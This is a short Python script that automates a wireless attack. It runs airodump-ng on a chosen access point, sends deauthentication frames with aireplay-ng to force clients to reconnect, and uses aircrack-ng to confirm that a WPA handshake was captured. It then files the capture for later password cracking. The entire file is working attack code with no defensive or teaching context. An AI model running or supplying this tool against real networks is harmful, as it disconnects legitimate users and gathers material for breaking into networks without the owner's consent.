#!/usr/bin/python
from time import sleep
import sys
import os
import signal
from subprocess import check_call
from subprocess import call
import subprocess
import datetime

def main():

    preMonInterface = sys.argv[1]
    bssid = sys.argv[2]
    ssid = sys.argv[3]
    channel = sys.argv[4]
    numberOfDeauths = sys.argv[5]
    timeToWait = sys.argv[6]
    FNULL = open(os.devnull, 'w')

    dump = subprocess.Popen(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", ssid, "--output-format", "pcap", preMonInterface+"mon"], stdout=FNULL, stderr=subprocess.STDOUT,  preexec_fn =os.setsid)
    # dump = subprocess.Popen(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", ssid, "--output-format", "pcap", preMonInterface+"mon"], preexec_fn =os.setsid)
    sleep(1)

    call(["aireplay-ng", "-a", bssid, "--deauth", numberOfDeauths, preMonInterface+"mon"], stdout=FNULL, stderr=subprocess.STDOUT)

    sleep(float(timeToWait))

    os.killpg(os.getpgid(dump.pid), signal.SIGTERM)
    sleep(1)
    os.killpg(os.getpgid(dump.pid), signal.SIGTERM)
    sleep(1)

    writefile = open("temp.txt", "w")

    call(["aircrack-ng", "-b", bssid, ssid+"-01.cap"], stdout=writefile, stderr=FNULL)
    
    writefile.close()
    sleep(1)
    filename = ssid + "-" + str(datetime.datetime.now())+".cap"
    call(["mv", ssid+"-01.cap", filename ], stdout=FNULL, stderr=subprocess.STDOUT)

    readfile = open("temp.txt", "r")
    captured = True
    for line in readfile:
        if "Got no data packets from target network!" in line:
            captured = False
    readfile.close()

    call(["rm", "temp.txt"], stdout=FNULL, stderr=subprocess.STDOUT)

    if captured == False:
        call(["rm", filename], stdout=FNULL, stderr=subprocess.STDOUT)
        print("No handshake captured :(")

    else:
        call(["mv", filename, "caps/"], stdout=FNULL, stderr=subprocess.STDOUT)
        print("Handshake captured!")

if __name__ == "__main__":
    main()